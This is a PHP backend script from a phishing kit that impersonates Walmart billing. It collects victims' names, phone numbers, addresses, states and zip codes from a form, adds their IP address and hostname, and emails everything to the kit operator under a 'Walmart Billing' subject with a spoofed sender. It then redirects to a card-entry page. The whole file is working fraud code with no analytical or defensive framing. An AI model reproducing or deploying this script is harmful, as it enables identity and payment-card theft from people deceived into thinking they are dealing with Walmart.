<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$browzer = $_SERVER["HTTP_USER_AGENT"];
$message .= "==========[BY Meed Smith]=========<br>\n";
$message .= "First Name             : ".$_POST['1']."<br>\n";
$message .= "Last Name              : ".$_POST['2']."<br>\n";
$message .= "Phone                  : ".$_POST['3']."<br>\n";
$message .= "Address                : ".$_POST['4']."<br>\n";
$message .= "Address 2              : ".$_POST['5']."<br>\n";
$message .= "State                  : ".$_POST['6']."<br>\n";
$message .= "Code Zip               : ".$_POST['7']."<br>\n";
$message .= "===============[IP]==============<br>\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip<br>\n";
$message .= "==========[BY Meed Smith]=========<br>";

include '../e-mail.php';
$subject = "> Walmart Billing - [$ip]";
$headers = "From: ~Meed-Smith~ <The.GrXn0v@support.com>";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";

mail($to, $subject, $message,$headers);

header("Location: ../card.php");
?>
